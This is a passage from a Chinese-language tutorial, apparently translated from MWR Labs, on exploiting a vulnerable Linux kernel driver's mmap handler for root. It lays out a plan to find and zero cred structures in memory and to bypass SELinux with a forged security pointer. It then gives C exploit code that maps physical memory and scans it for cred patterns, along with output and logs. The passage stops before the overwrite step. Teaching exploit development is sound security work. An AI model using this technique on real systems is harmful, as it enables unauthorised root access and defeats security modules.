        atomic_t usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t subscribers; /* number of processes subscribed */
        void *put_addr;
        unsigned magic;
    #define CRED_MAGIC 0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
        kuid_t uid; /* real UID of the task */
        kgid_t gid; /* real GID of the task */
        kuid_t suid; /* saved UID of the task */
        kgid_t sgid; /* saved GID of the task */
        kuid_t euid; /* effective UID of the task */
        kgid_t egid; /* effective GID of the task */
        kuid_t fsuid; /* UID for VFS ops */
        kgid_t fsgid; /* GID for VFS ops */
        unsigned securebits; /* SUID-less security management */
        kernel_cap_t cap_inheritable; /* caps our children can inherit */
        kernel_cap_t cap_permitted; /* caps we're permitted */
        kernel_cap_t cap_effective; /* caps we can actually use */
        kernel_cap_t cap_bset; /* capability bounding set */
        kernel_cap_t cap_ambient; /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char jit_keyring; /* default keyring to attach requested
        * keys to */
        struct key __rcu *session_keyring; /* keyring inherited over fork */
        struct key *process_keyring; /* keyring private to this process */
        struct key *thread_keyring; /* keyring private to this thread */
        struct key *request_key_auth; /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void *security; /* subjective LSM security */
    #endif
        struct user_struct *user; /* real user ID subscription */
        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative
        to. */
        struct group_info *group_info; /* supplementary groups for euid/fsgid */
        struct rcu_head rcu; /* RCU deletion hook */
    };
cred结构的目的是保持我们线程的凭据。
这意味着我们可以知道这个结构中的大部分值，因为我们可以简单地从`/proc//status`中读取它们或使用系统调用来获取它们。
如果我们查看结构定义，那么我们观察到有八个连续的整数变量（uid，gid，suid，sgid等）。
这些后面跟着一个四字节的`securebits`变量，后面跟着四个或五个（实际的数字取决于内核版本）已知长长整型（cap_inheritable等）。
我们获得root权限的计划是：
    1.获取我们的凭证
    2.扫描内存以查找8个整数的模式，与我们的凭证相匹配，然后允许我们的功能使用4-5 long long values. uids/gids和功能之间应该有四个字节的空间
    3.将uids/gids替换为值0
    4.调用getuid（）并检查我们是否是root用户
    5.如果是，请将值替换为值0xffffffffffffffff
    6.如果没有，则恢复uids/gids的旧值，然后继续搜索; 从第2步开始重复
    7.获取到root权限，打破循环。
在某些情况下，这个计划将不起作用，例如：
    1.如果内核硬化且某些组件正在监视privesc（例如某些三星移动设备上的Knox）。
    2.如果我们已经有一个0的uid。在这种情况下，我们可能会损害内核中的某些内容，因为内核在其内存中包含大量的0，并且我们的模式将无用。
    3.如果启用了一些安全模块（SELinux，Smack等），我们可能会获得部分安全模块，但安全模块需要在后续步骤中绕过。
在安全模块的情况下，cred结构的`security`字段保存一个指向由内核使用的特定安全模块定义的结构的指针。
例如，对于SELinux，它将指向包含以下结构的内存区域：
    struct task_security_struct {
        u32 osid; /* SID prior to last execve */
        u32 sid; /* current SID */
        u32 exec_sid; /* exec SID */
        u32 create_sid; /* fscreate SID */
        u32 keycreate_sid; /* keycreate SID */
        u32 sockcreate_sid; /* fscreate SID */
    };
我们可以用一个我们有控制权的地址替`security`字段中的指针，并强制使用sid值。（如果给定的体系结构（如arm，aarch64）允许直接从内核访问用户空间映射，那么我们可以提供用户空间映射）
这个过程应该是相对较快的，因为像内核或init这样的大多数特权标签的值都应该在0到512之间。
要绕过SELinux，可以尝试以下步骤：
    ·准备一个新的SELinux策略，将我们当前的SELinux上下文设置为宽容
    ·伪造包含全零的伪安全结构
    ·尝试重新加载SELinux策略
    ·恢复旧的安全指针
    ·尝试执行之前由SELinux禁止的恶意操作
    ·如果它有效，我们已经绕过了SELinux
    ·如果不是，则在我们的伪安全结构中将sid值增加1，然后重试
### 4.2 基本的mmap处理程序利用
在本文的这一部分中，我们将尝试为以下代码开发完整的root exploit：
    static int simple_mmap(struct file *filp, struct vm_area_struct *vma)
    {
        printk(KERN_INFO "MWR: Device mmap\n");
        printk(KERN_INFO "MWR: Device simple_mmap( size: %lx, offset: %lx)\n", vma>vm_end
    - vma->vm_start, vma->vm_pgoff);
        if (remap_pfn_range(vma, vma->vm_start, vma->vm_pgoff, vma->vm_end - vma>vm_start,
        vma->vm_page_prot))
        {
            printk(KERN_INFO "MWR: Device mmap failed\n");
            return -EAGAIN;
        }
        printk(KERN_INFO "MWR: Device mmap OK\n");
        return 0;
    }
所提供的代码有两个漏洞：
    1.'vma-> vm_pgoff'在没有验证的情况下被用作'remap_pfn_range'中的物理地址。
    2.映射的大小将被传递给'remap_pfn_range'， 没有经过验证。
在我们的漏洞利用开发的第一步中，让我们创建一些代码来触发漏洞并使用它来创建一个巨大的内存映射：
    int main(int argc, char * const * argv)
    {
        printf("[+] PID: %d\n", getpid());
        int fd = open("/dev/MWR_DEVICE", O_RDWR);
        if (fd < 0)
        {
            printf("[-] Open failed!\n");
            return -1;
        }
        printf("[+] Open OK fd: %d\n", fd);
        unsigned long size = 0xf0000000;
        unsigned long mmapStart = 0x42424000;
        unsigned int * addr = (unsigned int *)mmap((void*)mmapStart, size, PROT_READ
    | PROT_WRITE, MAP_SHARED, fd, 0x0);
        if (addr == MAP_FAILED)
        {
            perror("Failed to mmap: ");
            close(fd);
            return -1;
        }
        printf("[+] mmap OK addr: %lx\n", addr);
        int stop = getchar();
        return 0;
    }
上面的代码将打开易受攻击的驱动程序，并调用带有0xf0000000字节的mmap作为大小和等于0的偏移量。下面可以看到我们有日志显示对mmap的调用已成功：
    $ ./mwr_client
    [+] PID: 3855
    [+] Open OK fd: 3
    [+] mmap OK addr: 42424000
并确认我们可以在内存映射中观察到：
    # cat /proc/3855/maps
    42424000-132424000 rw-s 00000000 00:06 30941 /dev/MWR_DEVICE
另外，在dmesg中，可以看到mmap成功了：
    [18877.692697] MWR: Device has been opened 2 time(s)
    [18877.692710] MWR: Device mmap
    [18877.692711] MWR: Device simple_mmap( size: f0000000, offset: 0)
    [18877.696716] MWR: Device mmap OK
如果检查物理地址空间，那么我们可以看到，通过这个映射，可以访问下面标记高亮的所有内容。
这是因为我们传递了0作为物理地址位置，大小为0xf0000000字节：
    # cat /proc/iomem
    '00000000-00000fff : reserved
    00001000-0009fbff : System RAM
    0009fc00-0009ffff : reserved
    000a0000-000bffff : PCI Bus 0000:00
    000c0000-000c7fff : Video ROM
    000e2000-000e2fff : Adapter ROM
    000f0000-000fffff : reserved
    000f0000-000fffff : System ROM
    00100000-dffeffff : System RAM
    bac00000-bb20b1e1 : Kernel code
    bb20b1e2-bb91c4ff : Kernel data
    bba81000-bbb2cfff : Kernel bss
    dfff0000-dfffffff : ACPI Tables
    e0000000-ffdfffff : PCI Bus 0000:00
    e0000000-e0ffffff : 0000:00:02.0'
    f0000000-f001ffff : 0000:00:03.0
    f0000000-f001ffff : e1000
    f0400000-f07fffff : 0000:00:04.0
    f0400000-f07fffff : vboxguest
    f0800000-f0803fff : 0000:00:04.0
    f0804000-f0804fff : 0000:00:06.0
    f0804000-f0804fff : ohci_hcd
    f0805000-f0805fff : 0000:00:0b.0
    f0805000-f0805fff : ehci_hcd
    fec00000-fec003ff : IOAPIC 0
    fee00000-fee00fff : Local APIC
    fffc0000-ffffffff : reserved
    100000000-11fffffff : System RAM
我们可以选择放大映射的大小，以便覆盖整个物理内存地址空间。 但是，我们不会这样做，这样就可以展示我们无法访问整个系统RAM时可能面临的一些限制。
下一步是在内存中实现对`cred`结构的搜索。 我们将按照第4.1节理论中的解释来做到这一点。
我们将稍微修改该过程，因为我们只需要搜索具有uid值的八个整数。
一个简单的实现如下所示：
    int main(int argc, char * const * argv)
    {
    ...
        printf("[+] mmap OK addr: %lx\n", addr);
        unsigned int uid = getuid();
        printf("[+] UID: %d\n", uid);
        unsigned int credIt = 0;
        unsigned int credNum = 0;
        while (((unsigned long)addr) < (mmapStart + size - 0x40))
        {
            credIt = 0;
            if (
                addr[credIt++] == uid &&
                addr[credIt++] == uid &&
                addr[credIt++] == uid &&
                addr[credIt++] == uid &&
                addr[credIt++] == uid &&
                addr[credIt++] == uid &&
                addr[credIt++] == uid &&
                addr[credIt++] == uid
                )
            {
                credNum++;
                printf("[+] Found cred structure! ptr: %p, credNum: %d\n", addr,
    credNum);
            }
            addr++;
        }
        puts("[+] Scanning loop END");
        fflush(stdout);
        int stop = getchar();
        return 0;
    }
在漏洞输出中，可以看到我们已经发现了一些潜在的`cred`结构：
    $ ./mwr_client
    [+] PID: 5241
    [+] Open OK fd: 3
    [+] mmap OK addr: 42424000
    [+] UID: 1000
    [+] Found cred structure! ptr: 0x11a86e184, credNum: 1
    [+] Found cred structure! ptr: 0x11a86e244, credNum: 2
    …
    [+] Found cred structure! ptr: 0x11b7823c4, credNum: 7